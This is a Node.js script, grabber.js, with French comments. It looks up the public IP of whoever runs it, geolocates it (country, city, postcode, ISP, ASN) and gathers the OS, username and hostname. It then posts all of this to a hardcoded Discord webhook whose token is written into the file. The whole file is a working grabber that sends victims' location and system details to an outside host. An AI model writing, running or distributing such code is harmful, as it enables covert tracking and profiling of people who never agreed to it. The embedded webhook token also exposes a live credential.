// language: JavaScript, file: grabber.js, runtime: Node 18+
// usage: node grabber.js
// dépendance: aucune (fetch est natif depuis Node 18)

const WEBHOOK = 'https://discord.com/api/webhooks/1547587284902084608/AB5fL_qdjA3ZsW25tKHUBuezFZtfexiL2uigVx8rlP2I_Ii0fpbGh5fD8ofQiDZWdFbY';

// timeout helper
function withTimeout(promise, ms, label) {
    return Promise.race([
        promise,
        new Promise((_, rej) => setTimeout(() => rej(new Error(label + ' timeout')), ms))
    ]);
}

async function getIP() {
    // ipify — juste l'IP, ultra fiable
    try {
        const r = await withTimeout(fetch('https://api.ipify.org?format=json'), 5000, 'ipify');
        const d = await r.json();
        if (d.ip) return d.ip;
    } catch (e) { console.warn('[ipify]', e.message); }
    // fallback
    try {
        const r = await withTimeout(fetch('https://ifconfig.me/ip'), 5000, 'ifconfig');
        const t = await r.text();
        if (t) return t.trim();
    } catch (e) { console.warn('[ifconfig]', e.message); }
    return null;
}

async function getGeo(ip) {
    // ip-api.com — gratuit, pas de clé, 45 req/min
    try {
        const r = await withTimeout(
            fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,isp,org,as,query`),
            5000, 'ip-api'
        );
        const d = await r.json();
        if (d.status === 'success') return d;
    } catch (e) { console.warn('[ip-api]', e.message); }

    // fallback ipwho.is
    try {
        const r = await withTimeout(fetch(`https://ipwho.is/${ip}`), 5000, 'ipwho');
        const d = await r.json();
        if (d.success) return {
            country: d.country,
            regionName: d.region,
            city: d.city,
            zip: d.postal,
            isp: d.connection?.isp,
            org: d.connection?.org,
            as: d.connection?.asn ? ('AS' + d.connection.asn) : '',
            query: d.ip
        };
    } catch (e) { console.warn('[ipwho]', e.message); }

    return {};
}

async function sendToDiscord(payload) {
    try {
        const r = await fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (r.status === 204) {
            console.log('✅ Envoyé au webhook');
            return true;
        }
        const txt = await r.text();
        console.error('❌ Webhook a répondu', r.status, txt);
        return false;
    } catch (e) {
        console.error('❌ Échec envoi webhook', e.message);
        return false;
    }
}

(async () => {
    console.log('🔍 Récupération de l\'IP…');
    const ip = await getIP();
    if (!ip) {
        console.error('❌ Impossible de récupérer l\'IP.');
        process.exit(1);
    }
    console.log('📍 IP =', ip);

    console.log('🌍 Récupération de la géo…');
    const geo = await getGeo(ip);
    console.log('   ', geo.country, geo.city, geo.isp);

    const payload = {
        username: 'searchfr · grabber',
        content: `**Nouveau lancement** — \`${ip}\``,
        embeds: [{
            title: '🌐 Rapport grabber',
            color: 0x6d5cff,
            fields: [
                { name: 'IP',      value: '`' + ip + '`',                    inline: true },
                { name: 'Pays',    value: geo.country || '—',                 inline: true },
                { name: 'Ville',   value: geo.city || '—',                    inline: true },
                { name: 'Région',  value: geo.regionName || '—',              inline: true },
                { name: 'CP',      value: geo.zip || '—',                     inline: true },
                { name: 'FAI',     value: geo.isp || '—',                     inline: true },
                { name: 'Org',     value: geo.org || '—',                     inline: true },
                { name: 'ASN',     value: geo.as || '—',                      inline: true },
                { name: 'OS',      value: process.platform + ' ' + process.arch, inline: true },
                { name: 'Node',    value: process.version,                    inline: true },
                { name: 'User',    value: process.env.USERNAME || process.env.USER || '—', inline: true },
                { name: 'Host',    value: require('os').hostname(),           inline: true },
                { name: 'Heure',   value: new Date().toISOString(),           inline: false }
            ],
            footer: { text: 'searchfr · node grabber' },
            timestamp: new Date().toISOString()
        }]
    };

    console.log('📤 Envoi au webhook…');
    const ok = await sendToDiscord(payload);
    process.exit(ok ? 0 : 1);
})();
